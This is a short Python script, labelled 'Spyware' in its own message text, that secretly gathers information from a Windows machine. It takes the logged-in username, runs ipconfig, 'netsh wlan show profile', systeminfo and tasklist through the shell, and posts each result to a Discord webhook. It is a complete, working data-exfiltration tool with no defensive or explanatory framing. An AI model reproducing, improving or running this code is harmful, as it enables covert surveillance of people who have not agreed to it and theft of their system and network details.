import os
import requests
import subprocess

def get_username():
    return os.getlogin()

def notify_webhook(username, webhook_url):
    message = f'Spyware: {username} is being monitored...'
    requests.post(webhook_url, json={'content': message})

def execute_command(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output

# Get the username of the user who ran the program
username = get_username()

# Define your webhook URL
webhook_url = 'Your_Discord_Webhook'

notify_webhook(username, webhook_url)

def get_ip_config():
    ipconfig_output = execute_command('ipconfig')
    requests.post(webhook_url, json={'content': ipconfig_output})

def get_wifi_profiles():
    wifi_profiles_output = execute_command('netsh wlan show profile')
    requests.post(webhook_url, json={'content': wifi_profiles_output})

def get_system_info():
    system_info_output = execute_command('systeminfo')
    requests.post(webhook_url, json={'content': system_info_output})

def get_running_processes():
    processes_output = execute_command('tasklist')
    requests.post(webhook_url, json={'content': processes_output})

get_ip_config()
get_wifi_profiles()
get_system_info()
get_running_processes()
